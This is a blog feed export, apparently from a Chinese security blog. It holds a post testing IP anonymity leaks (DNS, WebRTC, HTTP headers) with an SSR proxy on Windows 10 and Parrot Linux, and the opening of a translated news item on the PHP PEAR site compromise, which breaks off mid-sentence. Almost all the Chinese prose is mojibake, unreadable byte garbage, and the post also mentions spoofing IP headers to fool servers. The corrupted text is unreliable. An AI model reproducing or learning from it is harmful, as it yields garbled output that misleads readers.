ÊØèÂΩìÊÇ®ÁöÑËÆ°ÁÆóÊú∫ÈúÄË¶ÅËÅîÁ≥ªÁΩëÁªú‰∏äÁöÑÊúçÂä°Âô®Êó∂Ôºå‰æãÂ¶ÇÂΩìÊÇ®Âú®ÊµèËßàÂô®‰∏≠ËæìÂÖ•URLÊó∂ÔºåÊÇ®ÁöÑËÆ°ÁÆóÊú∫‰ºöËÅîÁ≥ªDNSÊúçÂä°Âô®Âπ∂ËØ∑Ê±ÇIPÂú∞ÂùÄ„ÄÇÂ§ßÂ§öÊï∞‰∫íËÅîÁΩëÊúçÂä°Êèê‰æõÂïÜ‰∏∫‰ªñ‰ª¨ÁöÑÂÆ¢Êà∑ÂàÜÈÖç‰∏Ä‰∏™DNSÊúçÂä°Âô®ÔºåÂÆÉ‰ª¨Áî®‰∫éÊéßÂà∂ÂíåËÆ∞ÂΩïÊÇ®ÁöÑ‰∫íËÅîÁΩëÊ¥ªÂä®„ÄÇ</p></blockquote><p>Âú®Êüê‰∫õÊÉÖÂÜµ‰∏ãÔºåÂç≥‰ΩøËøûÊé•Âà∞ÂåøÂêçÁΩëÁªúÔºåÊìç‰ΩúÁ≥ªÁªü‰ªçÂ∞ÜÁªßÁª≠‰ΩøÁî®ÂÖ∂ÈªòËÆ§DNSÊúçÂä°Âô®ÔºåËÄå‰∏çÊòØÁî±ÂåøÂêçÁΩëÁªúÂàÜÈÖçÁªôÊÇ®ËÆ°ÁÆóÊú∫ÁöÑÂåøÂêçDNSÊúçÂä°Âô®„ÄÇËøôË¢´Áß∞‰∏∫Ê≥ÑÊºè„ÄÇDNSÊ≥ÑÊºèÊòØ‰∏ªË¶ÅÁöÑÈöêÁßÅÂ®ÅËÉÅÔºåÂõ†‰∏∫ÂåøÂêçÁΩëÁªúÂèØËÉΩ‰ºöÂú®ÁßÅ‰∫∫Êï∞ÊçÆÊ≥ÑÈú≤ÁöÑÂêåÊó∂Êèê‰æõÈîôËØØÁöÑÂÆâÂÖ®ÊÑü„ÄÇ</p><p>ÂΩìÊÇ®ÁöÑDNSËØ∑Ê±ÇË¢´Ê≥ÑÈú≤Êó∂ÔºåÂèëÈÄÅÂà∞/‰ªéÁΩëÁ´ôÂèëÈÄÅÁöÑÂÆûÈôÖÊï∞ÊçÆÂ∞Ü‰∏çË¢´ÊçïËé∑„ÄÇ‰ΩÜÂÆÉ‰ªçÁÑ∂ÂèØ‰ª•ÂêëÁ™ÉÂê¨ËÄÖÊèê‰æõÂÖ≥‰∫éÊÇ®ËÆøÈóÆÁöÑÁΩëÁ´ôÁöÑË∂≥Â§ü‰ø°ÊÅØ„ÄÇÂÆÉ‰πü‰∏∫DNSÁóÖÊØíÊâìÂºÄÈó®Êà∑ÔºåÂèØÁî®‰∫éÈíìÈ±ºÊîªÂáª(DNSÂä´ÊåÅ)„ÄÇ</p><h3 id="WEBRTCÊ≥ÑÈú≤"><a href="#WEBRTCÊ≥ÑÈú≤" class="headerlink" title="WEBRTCÊ≥ÑÈú≤"></a>WEBRTCÊ≥ÑÈú≤</h3><blockquote><p>‰ªÄ‰πàÊòØWEBRTCÔºü</p><p>WebRTCÔºàWeb Real-Time CommunicationÔºâÊòØ‰∏Ä‰∏™ÊîØÊåÅÁΩëÈ°µÊµèËßàÂô®ËøõË°åÂÆûÊó∂ËØ≠Èü≥ÂØπËØùÊàñËßÜÈ¢ëÂØπËØùÁöÑÊäÄÊúØÔºåÊòØË∞∑Ê≠å2010Âπ¥‰ª•6820‰∏áÁæéÂÖÉÊî∂Ë¥≠Global IP SolutionsÂÖ¨Âè∏ËÄåËé∑ÂæóÁöÑ‰∏ÄÈ°πÊäÄÊúØ„ÄÇ2011Âπ¥5ÊúàË∞∑Ê≠åÂºÄÊîæ‰∫ÜWebRTCÁöÑÊ∫ê‰ª£Á†ÅÔºåÂú®Ë°å‰∏öÂÜÖÂæóÂà∞‰∫ÜÂπøÊ≥õÁöÑÊîØÊåÅÂíåÂ∫îÁî®„ÄÇ</p></blockquote><p>Âç≥‰ΩøÊÇ®Ê≠£Âú®‰ΩøÁî® VPNÔºå‰πü‰ºöÂá∫Áé∞Â§ö‰∏™ÂèØ‰ª•Ê≥ÑÊºè IP Âú∞ÂùÄÁöÑ‚ÄúÊÑèÊÉ≥‰∏çÂà∞ÁöÑÈîôËØØ‚Äù„ÄÇÂÆÉË¢´Áß∞‰∏∫ WebRTCÔºàWeb ÂÆûÊó∂ÈÄö‰ø°ÔºâÊ≥ÑÊºè„ÄÇ</p><p>WebRTC ÂÖÅËÆ∏ÊµèËßàÂô®ÂÜÖÈÉ®ÁöÑÂÆûÊó∂ÈÄö‰ø°„ÄÇËøôÂæàÊñπ‰æøÔºå‰ΩÜ‰πüÊúâ‰∏Ä‰∏™Áº∫ÁÇπ„ÄÇÂç≥‰ΩøÊâìÂºÄ‰∫ÜVPNÔºåWebRTC ‰πüËÉΩÈªòËÆ§Ê≥ÑÊºèÊÇ®ÁöÑÁúüÂÆûÂú∞ÂùÄ„ÄÇWebRTC ÂçèËÆÆÈÄöËøáËÆæËÆ°ÂÆûÁé∞Ê≠§ÁõÆÁöÑÔºåÂç≥‰ΩøÊòØÊúÄÂ•ΩÁöÑ VPN ‰πüÊó†Ê≥ïÂßãÁªà‰øùÊä§Ëá™Â∑±ÁöÑ‰ø°ÊÅØ‰∏çË¢´Ê≥ÑÈú≤„ÄÇ</p><p>Âõ†Ê≠§ÔºåÂ¶ÇÊûú‰ΩøÁî®ÈªòËÆ§ÂêØÁî® WebRTC ÁöÑÊµèËßàÂô®ÔºåÂàôÈááÂèñÂøÖË¶ÅÁöÑÈ¢ÑÈò≤Êé™ÊñΩËøô‰∏ÄÁÇπÂçÅÂàÜÈáçË¶Å„ÄÇÂú®ÈÄâÊã©ÁöÑÊµèËßàÂô®‰∏≠ÊêúÁ¥¢Â¶Ç‰ΩïÂÖ≥Èó≠ WebRTCÔºåÊàñÊü•ÊâæÊòØÂê¶Â≠òÂú®ÂèØÂÆâË£ÖÁî®Êù•Á¶ÅÁî® WebRTC ÁöÑ WebRTC ÈòªÊ≠¢Êèí‰ª∂„ÄÇËØ∑ËÆ∞‰ΩèÔºåÁ¶ÅÁî® WebRTC ÂèØËÉΩ‰ºöÂØºËá¥ÈÉ®ÂàÜÁΩëÁ´ôÔºàÂ¶Ç Google HangoutsÔºâÊó†Ê≥ïÊ≠£Â∏∏Â∑•‰ΩúÔºåÂõ†Ê≠§ÊÇ®ÂèØËÉΩÈúÄË¶ÅÂú®ÁâπÂÆöÊÉÖÂÜµ‰∏ãÂêØÁî®ÂÆÉ„ÄÇ</p><pre class=" language-payload"><code class="language-payload">FirefoxÊµèËßàÂô®Á¶ÅÁî®WebRTCÁöÑÊñπÊ≥ïÊòØÔºöÂú®ÊµèËßàÂô®‰∏äËæìÂÖ•Ôºöabout:config„ÄÇ‰πãÂêéÊêúÁ¥¢Ôºömedia.peerconnection.enabled„ÄÇÊâæÂà∞ÂÆÉÂêéÂèåÂáªÔºåÂ∞ÜÂÖ∂ÊîπÊàê false Âç≥ÂèØ„ÄÇChromeÊµèËßàÂô®Á¶ÅÁî®WebRTCÁöÑÊñπÊ≥ïÊòØÔºöÂú®ChromeÂ∫îÁî®ÂïÜÂ∫óÈáåÔºåÂÆâË£Ö‰∏Ä‰∏™Âêç‰∏∫WebRTC Leak PreventÁöÑÊâ©Â±ïÔºåÁÑ∂ÂêéÈÄâÊã© Use my Porxy server(if present) Âç≥ÂèØ„ÄÇ</code></pre><h3 id="HTTPheaderÊ≥ÑÈú≤"><a href="#HTTPheaderÊ≥ÑÈú≤" class="headerlink" title="HTTPheaderÊ≥ÑÈú≤"></a>HTTPheaderÊ≥ÑÈú≤</h3><p>httpËØ∑Ê±ÇÊï∞ÊçÆÂåÖ‰∏≠ÁöÑ<code>header</code>:</p><pre class=" language-html"><code class="language-html">GET / HTTP/1.1Host: www.4399.comConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6Cookie: home4399=yes; UM_distinctid=169050f7793431-0062d73fb17ef-b79183d-144000-169050f7794319; CNZZDATA30039538=cnzz_eid%3D1853484585-1550564275-%26ntime%3D1550564275If-None-Match: W/"5c6b5dba-2a86c"If-Modified-Since: Tue, 19 Feb 2019 01:36:58 GMT</code></pre><p>ÂèØËßÅÔºåÈÄöËøá<code>header</code>‰∏≠ÁöÑ<code>Accept-Language</code>,<code>User-Agent</code>Ê≥ÑÈú≤‰∫Ü‰∏Ä‰∫õ‰ø°ÊÅØÔºåÂ¶ÇÔºöÊàë‰ª¨‰ΩøÁî®ÁöÑÊòØ‰∏≠ÊñáÂíåËã±ÊñáÔºåÁî®Êà∑ËØ¶ÁªÜUA‰ø°ÊÅØÁ≠âÁ≠â„ÄÇ</p><p>‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÊàë‰ª¨‰πüÂèØ‰ª•‰ΩøÁî®<code>X-Forwarded-For</code>,<code>X-Client-IP</code>,<code>X-Real-IP</code>,<code>X-Remote-IP</code>Á≠âËØ∑Ê±ÇÂ±ûÊÄß‰º™ÈÄ†IP‰ªéËÄåÈ™óËøáÊúçÂä°Âô®ÁöÑIPËØÜÂà´„ÄÇ</p><h2 id="IPÂåøÂêçÊÄßÊµãËØï"><a href="#IPÂåøÂêçÊÄßÊµãËØï" class="headerlink" title="IPÂåøÂêçÊÄßÊµãËØï"></a>IPÂåøÂêçÊÄßÊµãËØï</h2><p>Êàë‰ª¨Êé•‰∏ãÊù•Âü∫‰∫éwindows10Âíåparrot linuxÂπ≥Âè∞‰ª£ÁêÜËøõË°åIPÂåøÂêçÊÄßÊµãËØïÔºå‰ª£ÁêÜËΩØ‰ª∂ÊòØÊúÄÊôÆÈÄöÁöÑ<code>Â∞èÈ£ûÊú∫(ssr)</code>ÔºåÂÄºÂæó‰∏ÄÊèêÁöÑÊòØ<code>ElectronÁâàÂ∞èÈ£ûÊú∫</code>Ëøò‰∏çÈîôÔºåË∑®Âπ≥Âè∞„ÄÇ</p><blockquote><p>‰ªÄ‰πàÊòØParrot linux?</p><p>Parrot Security OSÔºàÁÆÄÁß∞‰Ωú„ÄåParrorSec„ÄçÊàñ„ÄåParrotÔºàÈπ¶ÈπâÔºâ„ÄçÔºâÊòØ‰∏Ä‰∏™Âü∫‰∫é Debian Èù¢ÂêëÂÆâÂÖ®ÁöÑ GNU/<a href="https://www.linuxprobe.com/" target="_blank" rel="noopener">Linux</a> ÂèëË°åÁâà„ÄÇÂÆÉÊèê‰æõ‰∫ÜËØ∏Â§öÁî®‰∫éÂÆâÂÖ®ÊµãËØï„ÄÅÊï∞Â≠óÂèñËØÅ„ÄÅËΩØ‰ª∂ÂºÄÂèëÂèäÈöêÁßÅÈò≤Êä§ÁöÑ‰∏ì‰∏öÂ∑•ÂÖ∑„ÄÇ</p><p>Parrot‰∏ékaliÁ±ª‰ººÔºå‰ΩÜÊØîkaliÂ§öÂæàÂ§öÂ∑•ÂÖ∑„ÄÇÂú®ÊàëÁõÆÂâç‰ΩøÁî®ÁöÑÊÉÖÂÜµÁúãÊù•ÔºåÂêåÁ≠âÈÖçÁΩÆ‰∏ãParrotË¶ÅÊØîkaliÁæéËßÇÊµÅÁïÖ„ÄÇ</p></blockquote><p>‰ΩøÁî®‰ª•‰∏ã‰∏â‰∏™ÁΩëÂùÄËøõË°åÂåøÂêçÊÄßÊ£ÄÊµãÔºö    </p><ul><li><a href="https://www.astrill.com/zh/vpn-leak-test" target="_blank" rel="noopener">https://www.astrill.com/zh/vpn-leak-test</a></li><li><a href="https://whoer.net/zh" target="_blank" rel="noopener">https://whoer.net/zh</a></li><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li></ul><p>ÈÄöËøáÊµãËØïÁõ¥ËßÇÂú∞ÊòæÁé∞Âá∫‰∏çÂêåÂπ≥Âè∞Ôºå‰∏çÂêåÊÉÖÂÜµ‰∏ãÁöÑÂåøÂêçÁ®ãÂ∫¶Ôºå‰ªéËÄåÂæóÂà∞ÂÖ∂Â∑ÆÂà´„ÄÇ</p><h3 id="Windows-10Âπ≥Âè∞"><a href="#Windows-10Âπ≥Âè∞" class="headerlink" title="Windows 10Âπ≥Âè∞"></a>Windows 10Âπ≥Âè∞</h3><p>Âú®ÊàëÁöÑÁâ©ÁêÜÊú∫<code>windows 10</code>Êú¨Âú∞ÂêØÁî®<code>Â∞èÈ£ûÊú∫</code>‰πãÂêéÔºåÊàë‰ª¨ÂàÜÂà´‰ªéÂá†‰∏™ÊµãËØïÂπ≥Âè∞Ëé∑Âæó‰∫ÜIPÂåøÂêçÊÄßÊµãËØïÁªìÊûúÔºö</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200332.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200512.png" alt=""></p><p><code>ceye.io</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219193744.png" alt=""></p><p>ÈÄöËøá‰º™ÈÄ†httpheader‰∏≠ÁöÑ<code>x-real-ip</code>Êàë‰ª¨ÂèØ‰ª•ÁªôËá™Â∑±Âä†‰∏ä‰∏ÄÂ±Ç‰º™Ë£ÖÔºå‰ΩÜÊòØÂπ∂‰∏çËÉΩÈÄÉËøáÊ£ÄÊµãÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219194704.png" alt=""></p><p>Áî±‰ª•‰∏ä‰∏â‰∏™ÁªìÊûúÂèØ‰ª•‰∫ÜËß£Âà∞ÔºåÂçïÁ∫ØÂú®win10‰∏ä‰ΩøÁî®Â∞èÈ£ûÊú∫‰ª£ÁêÜÊó∂ÔºåastrillÂíåwhoerÂπ≥Âè∞ÁöÑÁªìÊûúÂÖ±ÂêåÂèçÊò†Âá∫‰∫ÜDNSÂíåWEBRTCÁöÑÊ≥ÑÈú≤Ôºå‰ª•ÂèäÈ°µÈù¢ËØ≠Ë®ÄÔºåÂΩìÂú∞Êó∂Èó¥Á≠â‰ø°ÊÅØ„ÄÇËÄåceyeÁöÑÁªìÊûúÊõ¥ÊòØÁõ¥Êé•ÂæóÂà∞‰∫ÜÊàë‰ª¨ÁöÑÁúüÂÆûIPÔºå‰ªÖÂá≠‰∏äËø∞‰ø°ÊÅØÂ∑≤ÁªèÂèØ‰ª•Á≤æÁ°ÆÁü•ÈÅìÊàëÊòØÂì™‰∏™ÊùëÁöÑ‰∫∫‰∫Ü(ÂºÄ‰∏™Áé©Á¨ëhhh)ÔºåÂõ†Ê≠§Âú®win10‰∏äÂ∞èÈ£ûÊú∫ÁöÑÂåøÂêçÊÄßÂ†™Âøß„ÄÇ</p><h3 id="Parrot-LinuxÂπ≥Âè∞"><a href="#Parrot-LinuxÂπ≥Âè∞" class="headerlink" title="Parrot LinuxÂπ≥Âè∞"></a>Parrot LinuxÂπ≥Âè∞</h3><p>Âú®ÊàëÁöÑËôöÊãüÊú∫<code>Parrot Linux</code>ÂêØÁî®<code>Â∞èÈ£ûÊú∫</code>‰πãÂêéÔºåÊàë‰ª¨ÂàÜÂà´‰ªéÂá†‰∏™ÊµãËØïÂπ≥Âè∞Ëé∑Âæó‰∫ÜIPÂåøÂêçÊÄßÊµãËØïÁªìÊûúÔºö</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195503.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195626.png" class="lazyload"></p><p><code>ceye.io</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195409.png" class="lazyload"></p><p>Áî±‰ª•‰∏ä‰∏â‰∏™ÁªìÊûúÂèØ‰ª•ÁúãÂà∞ÔºåÊ≤°ÊúâÂá∫Áé∞‰∏éÊàëÊâÄÂú®Âú∞ÊúâÂÖ≥ÁöÑ‰ø°ÊÅØÔºåÊ£ÄÊµãÂà∞ÁöÑIP‰πü‰∏çÊòØÊàëÁöÑÁúüÂÆûIP(117.170.**<em>.\</em>**)ÔºåËÄåÊòØ‰ª£ÁêÜÊúçÂä°Âô®ÁöÑIPÂú∞ÂùÄÔºåÊ≤°ÊúâÂá∫Áé∞DNSÂíåWEBRTCÊ≥ÑÈú≤ÔºåÂõ†ËÄåÂèØ‰ª•ÁúãÂá∫<code>Parrot linux</code>‰Ωú‰∏∫‰∏Ä‰∏™Èù¢ÂêëÂÆâÂÖ®ÊµãËØïÁöÑlinuxÂèëË°åÁâàÁöÑÂåøÂêçÊÄßÊòØÂçÅÂàÜ‰πãÈ´òÁöÑÔºåÁõ∏ÂØπ‰∫éwin10ÂåøÂêçÊÄßË¶ÅÊèêÈ´ò‰∫Ü‰∏çÂ∞ë„ÄÇ</p><h3 id="‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ"><a href="#‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ" class="headerlink" title="‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ"></a>‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ</h3><p>Êó¢ÁÑ∂ParrotÁöÑÂåøÂêçÊÄßÊØîËæÉÂ•ΩÔºåÈÇ£Êàë‰ª¨Êääparrot‰Ωú‰∏∫Ë∑≥ÊùøÔºàparrot‰∏äÁöÑÂ∞èÈ£ûÊú∫ÂÖÅËÆ∏Â±ÄÂüüÁΩëËøûÊé•ÔºâÔºåÁî®win10ËøûÊé•ËøêË°åÂú®parrot‰∏äÁöÑÂ∞èÈ£ûÊú∫‰ª£ÁêÜÔºå‰ºöÊúâ‰ªÄ‰πàÁªìÊûúÂë¢Ôºü</p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219201252.png" class="lazyload"></p><p>ceye.ioÂíåastrillÊ£ÄÊµãÊòØÊ≠£Â∏∏ÁöÑÔºåÊ≤°ÊúâÊ≥ÑÈú≤‰ø°ÊÅØÔºå‰ΩÜÊòØ‰ªéwhoer.netÁöÑÁªìÊûúÁúãÊù•ÔºöÊ≥ÑÈú≤‰∫ÜÊó∂Âå∫ÔºåËØ≠Ë®ÄÁ≠â‰ø°ÊÅØ„ÄÇÊúÄÂÖ≥ÈîÆÁöÑÊòØWEBRTCÁõ¥Êé•Ê≥ÑÈú≤Âá∫‰∫ÜÊàë‰ª¨ÁöÑÁúüÂÆûIPÂú∞ÂùÄÂíåÂÜÖÁΩëÂú∞ÂùÄ„ÄÇ</p><blockquote><p>Parrot OS‰∏≠Ëá™Â∏¶TorÁΩëÁªúÔºåÂíåÂåøÂêçÊ®°ÂºèÔºå‰ª•‰∏äÊµãËØïÂùáÂú®Êú™ÂºÄÂêØTorÁΩëÁªúÂíåÂåøÂêçÊ®°ÂºèÊÉÖÂÜµ‰∏ãÊµãËØï„ÄÇ</p><p>ÊÄªÁöÑÊù•ËØ¥ÔºåÂçïÁ∫ØÂú∞‰ΩøÁî®ParrotËøòÊòØÂæàÈ¶ôÂæàÂåøÂêçÁöÑÔºÅ</p></blockquote><h2 id="ÊÄùËÄÉ"><a href="#ÊÄùËÄÉ" class="headerlink" title="ÊÄùËÄÉ"></a>ÊÄùËÄÉ</h2><p>ÂΩì‰ªäÁöÑÁßëÊäÄÂèëÂ±ïËøÖÈÄüÔºåÈöêÁßÅ‰ø°ÊÅØ‰πüÊòæÂæóË∂äÊù•Ë∂äÈáçË¶ÅÔºåÈÄöËøá‰∏ÄÈÉ®ÂàÜÁúüÂÆûÁöÑËõõ‰∏ùÈ©¨ËøπÔºåÂ∞±ÂèØËÉΩËøòÂéüÂá∫Á≤æÂáÜÁöÑ‰ø°ÊÅØÊ®°Âûã„ÄÇIPV6Ê≥ÑÈú≤ÔºåDNSÊ≥ÑÈú≤ÔºåWEBRTCÊ≥ÑÈú≤ÔºåHTTPheaderÊ≥ÑÈú≤ÈÉΩÂèØËÉΩÂØºËá¥‰Ω†Âú®ÁΩëÁªú‰∏äÁöÑÂåøÂêçÊÄßÈôç‰ΩéÔºåÂèØËÉΩÂØπ‰∫éÊôÆÈÄö‰∫∫Êù•ËØ¥ÔºåËøôÂè™ÊòØÊó†ÂÖ≥Á¥ßË¶ÅÁöÑ‰∫ãÊÉÖÔºå‰ΩÜÂØπ‰∫éËØ∏‰ΩçÂÆâÂÖ®‰ªé‰∏öËÄÖÊù•ËØ¥ÔºåÂÖ∂‰∏≠Âà©Âºä‰∏çÁî®Â§öË®Ä„ÄÇ</p><blockquote><p>Ê≥®Êòé: <a href="https://mp.weixin.qq.com/s/Otk44j7UNbT_FX9mXq6o4Q" target="_blank" rel="noopener">Ê≠§ÊñáÁ´†È¶ñÂèë‰∫éÂÆâÊÅíÁΩëÁªúÁ©∫Èó¥ÂÆâÂÖ®ËÆ≤Ê≠¶Â†ÇÂÖ¨‰ºóÂè∑</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÁΩëÁªúÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÁΩëÁªúÂÆâÂÖ® </tag>
            
            <tag> IPÂåøÂêçÊÄß </tag>
            
            <tag> ParrotOS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php_pear_was_attacked</title>
      <link href="/2019/01/31/php-pear-was-attacked/"/>
      <url>/2019/01/31/php-pear-was-attacked/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><blockquote><p>ËØëÊñáÂ£∞ÊòéÔºö</p><p>Êú¨ÊñáÊòØÁøªËØëÊñáÁ´†ÔºåÊñáÁ´†Âéü‰ΩúËÄÖ<a href="https://thehackernews.com/p/authors.html" target="_blank" rel="noopener">Mohit Kumar</a>ÔºåÊñáÁ´†Êù•Ê∫êÔºö<a href="https://thehackernews.com/2019/01/php-pear-hacked.html" target="_blank" rel="noopener">https://thehackernews.com/2019/01/php-pear-hacked.html</a></p></blockquote><h1 id="PHP-PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ"><a href="#PHP-PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ" class="headerlink" title="PHP PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ"></a>PHP PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ</h1><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130104752.png" alt=""></p><blockquote><p>Â∞èÂøÉÔºÅÂ¶ÇÊûúÊÇ®Âú®ËøáÂéª6‰∏™ÊúàÂÜÖ‰ªéPHPÂÆòÊñπÁΩëÁ´ô‰∏ãËΩΩ‰∫ÜPHP PEARÂåÖÁÆ°ÁêÜÂô®ÔºåÊàë‰ª¨Âè™ËÉΩÂæàÈÅóÊÜæÂØπÊÇ®ËØ¥ÊÇ®ÁöÑÊúçÂä°Âô®ÂèØËÉΩÂ∑≤ÁªèÊàê‰∏∫ËÇâÈ∏°„ÄÇ</p></blockquote><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>‰∏äÂë®ÔºåPEARÁöÑÁª¥Êä§‰∫∫ÂëòÂèëÁé∞Êúâ‰∫∫<strong>ÊÅ∂ÊÑèÊõøÊç¢‰∫ÜÂéüÊù•ÁöÑPHP PEARÂåÖÁÆ°ÁêÜÂô®Ôºàgo-pear.pharÔºâ</strong>Ôºå‰∏îÈªëÂÆ¢Âú®Ê†∏ÂøÉPEARÊñá‰ª∂Á≥ªÁªü‰∏≠‰ΩøÁî®‰∫ÜÁØ°ÊîπÂêéÁöÑÁâàÊú¨ÔºåÂú®Ê≠§‰πãÂêéÁª¥Êä§‰∫∫ÂëòËøÖÈÄüÂÖ≥Èó≠‰∫ÜPEARÁöÑÂÆòÊñπÁΩëÁ´ôÔºàpear-php.netÔºâ„ÄÇ</p><p>Â∞ΩÁÆ°PEARÂºÄÂèë‰∫∫ÂëòËøòÂú®ÂàÜÊûêÊÅ∂ÊÑèÁ®ãÂ∫èÂåÖÔºå‰ΩÜÂõ¢ÈòüÂú®2019Âπ¥1Êúà19Êó•ËøÖÈÄüÂèëÂ∏ÉÁöÑÂÆâÂÖ®ÂÖ¨ÂëäËØÅÂÆûÔºåË¢´ÈªëÂÆ¢ÂÖ•‰æµÁöÑÁΩëÁ´ôÊúçÂä°ÊîæÁΩÆ‰∫ÜÂèóÊÅ∂ÊÑè‰ª£Á†ÅÊ±°ÊüìÁöÑÂÆâË£ÖÊñá‰ª∂Ëá≥Â∞ëÂçäÂπ¥‰πã‰πÖÔºåÂèØÊÉ≥ËÄåÁü•ÊúâÂ§öÂ∞ë‰∫∫‰∏ãËΩΩ‰∫ÜË¢´Ê±°ÊüìÁöÑÂÆâË£ÖÂåÖ„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130105824.png" alt=""></p><h2 id="PHP-PEARÊòØ‰ªÄ‰πàÔºü"><a href="#PHP-PEARÊòØ‰ªÄ‰πàÔºü" class="headerlink" title="PHP-PEARÊòØ‰ªÄ‰πàÔºü"></a>PHP-PEARÊòØ‰ªÄ‰πàÔºü</h2><p>PHPÊâ©Â±ïÂíåÂ∫îÁî®Á®ãÂ∫èÂ≠òÂÇ®Â∫ìÔºàPEARÔºâÊòØ‰∏Ä‰∏™Á§æÂå∫È©±Âä®ÁöÑÊ°ÜÊû∂ÂíåÂàÜÂèëÁ≥ªÁªüÔºåÂÆÉ‰ΩøÂæó‰ªª‰Ωï‰∫∫ÈÉΩÂèØ‰ª•ÊêúÁ¥¢Âíå‰∏ãËΩΩ‰ΩøÁî®PHPÁºñÁ®ãËØ≠Ë®ÄÁºñÂÜôÁöÑÂÖçË¥πÂ∫ì„ÄÇËøô‰∫õÂºÄÊ∫êÂ∫ìÔºàÊàñËÆ∏Áß∞‰πã‰∏∫ËΩØ‰ª∂ÂåÖÊõ¥‰∏∫ÊÅ∞ÂΩìÔºâÂÖÅËÆ∏ÂºÄÂèë‰∫∫ÂëòÂú®ÂÖ∂È°πÁõÆÂíåÁΩëÁ´ô‰∏≠ËΩªÊùæÊ∑ªÂä†ÂÖ∂‰ªñÂäüËÉΩÔºåÂåÖÊã¨Ë∫´‰ªΩÈ™åËØÅÔºåÁºìÂ≠òÔºåÂä†ÂØÜÔºåWebÊúçÂä°Á≠âÁ≠â„ÄÇ</p><p>ÂΩìÊÇ®‰∏ãËΩΩÁî®‰∫éUnix / Linux / BSDÁ≥ªÁªüÁöÑPHPËΩØ‰ª∂Êó∂ÔºåPEAR‰∏ãËΩΩÁÆ°ÁêÜÂô®Ôºàgo-pear.pharÔºâÂ∑≤È¢ÑÂÖàÂÆâË£ÖÔºåËÄåWindowsÂíåMac OS XÁî®Êà∑Âú®ÂøÖË¶ÅÁöÑÊó∂‰æØÈúÄÊâãÂä®ÂÆâË£ÖËØ•ÁªÑ‰ª∂„ÄÇ</p><p>Áî±‰∫éËÆ∏Â§öÁΩëÁªúÊâòÁÆ°ÂÖ¨Âè∏ÔºàÂåÖÊã¨ÂÖ±‰∫´ÊâòÁÆ°ÊúçÂä°Êèê‰æõÂïÜÔºâ‰πüÂÖÅËÆ∏ÂÖ∂Áî®Êà∑ÂÆâË£ÖÂíåËøêË°åPEARÔºåÂõ†Ê≠§ËøôÁßçÊúÄÊñ∞ÁöÑÂÆâÂÖ®ÊºèÊ¥ûÂèØËÉΩ‰ºö<strong>ÂΩ±ÂìçÂ§ßÈáèÁΩëÁ´ôÂèäÂÖ∂ËÆøÈóÆËÄÖ</strong>„ÄÇ</p><h2 id="PEAR-Âõ¢ÈòüÂ£∞Êòé"><a href="#PEAR-Âõ¢ÈòüÂ£∞Êòé" class="headerlink" title="PEAR Âõ¢ÈòüÂ£∞Êòé"></a>PEAR Âõ¢ÈòüÂ£∞Êòé</h2><blockquote><p>‚ÄúÂ¶ÇÊûúÊÇ®Âú®ËøáÂéªÂÖ≠‰∏™Êúà‰πãÂÜÖÂ∑≤Áªè‰∏ãËΩΩ‰∫ÜËøô‰∏™<code>go-pear.phar</code>ÔºåÈÇ£‰πàÊÇ®Â∫îËØ•‰ªé<code>GitHubÔºàpear / 